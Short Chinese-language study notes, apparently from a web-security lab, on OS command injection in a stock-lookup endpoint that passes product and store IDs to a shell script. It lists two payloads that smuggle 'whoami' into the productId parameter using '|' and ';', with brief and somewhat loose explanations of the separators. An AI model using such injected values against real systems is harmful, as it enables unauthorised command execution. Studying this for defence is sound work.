商品库存信息查询处，存在命令执行注入



https://insecure-website.com/stockStatus?productID=381&storeID=29

为了提供库存信息，应用程序必须查询各种旧系统。由于历史原因，该功能是通过使用产品和存储ID作为参数调用shell命令来实现的：

```javascript
stockreport.pl 381 29
```



payload:

```javascript
productId=1+|+whoami+||+&storeId=1
productId=1+;+whoami+||+&storeId=1
```



; 命令并行执行

| 或者 ，命令执行任意一个就会有返回结果